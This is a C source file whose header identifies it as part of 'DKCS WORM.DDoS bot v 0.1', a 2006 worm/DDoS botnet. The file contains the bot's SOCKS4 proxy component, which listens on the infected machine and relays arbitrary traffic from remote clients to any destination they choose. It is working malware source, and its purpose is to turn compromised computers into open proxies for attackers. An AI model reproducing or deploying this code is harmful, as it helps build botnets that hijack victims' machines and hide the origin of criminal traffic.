//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
#define SOCKS4_CONNECT		1
#define SOCKS4_GRANT		90
#define SOCKS4_REJECT		91
//-----------------------------------------------------------------
typedef struct SOCKS4HEADER {
	u_char			vn;
	u_char			cd;
	unsigned short	destport;
	unsigned long	destaddr;
	char			userid[1024];
} SOCKS4HEADER;
//-----------------------------------------------------------------
DWORD WINAPI Socks4ClientThread(LPVOID);
void transfer_loop(SOCKET, SOCKET);
//-----------------------------------------------------------------
DWORD WINAPI SocksDaemon(LPVOID param){

	struct	sockaddr_in info;
	struct	sockaddr_in client_in;
	SOCKET	server;
	SOCKET	client;
	DWORD	lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = htons(MY_MACRO_SOCKS4_PORT);
	info.sin_addr.s_addr = INADDR_ANY;
	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(bind(server, (SOCKADDR *)&info, sizeof(info)) != 0){
		return 0;
	}
	if(listen(server, 10) != 0){
		return 0;
	}
	while(TRUE){
		client = accept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
return 0;
}
//-----------------------------------------------------------------
DWORD WINAPI Socks4ClientThread(LPVOID pParam){

	struct		SOCKS4HEADER hdr;
	SOCKET		client=(SOCKET)pParam;
	timeval		timeout;
	fd_set		fd;
	SOCKADDR_IN target_in;
	SOCKET		outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if(select(0, &fd, NULL, NULL, &timeout) == 0){
		closesocket(client);
		return 0;
	}
	if(recv(client, (char *)&hdr, sizeof(hdr), 0) <= 0){
		closesocket(client);
		return 0;
	}
	if(hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT){
		closesocket(client);
		return 0;
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(connect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR){
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		send(client, (char *)&hdr, 8, 0);
		closesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	send(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}
//-----------------------------------------------------------------
void transfer_loop(SOCKET target, SOCKET client){

	int		len;
	char	buf[1024];
	fd_set	fd;

	while(TRUE){
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);
		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);
		if(FD_ISSET(client, &fd)){
			if((len = recv(client,buf,sizeof(buf),0))== -1){
				break;
			}
			if(send(target,buf,len,0)== -1){
				break;
			}
		}
	    if(FD_ISSET(target,&fd)){
			if((len = recv(target,buf,sizeof(buf),0))== -1){
				break;
			}
			if(send(client,buf,len,0)== -1){
				break;
			}
		}
	}
}
//-----------------------------------------------------------------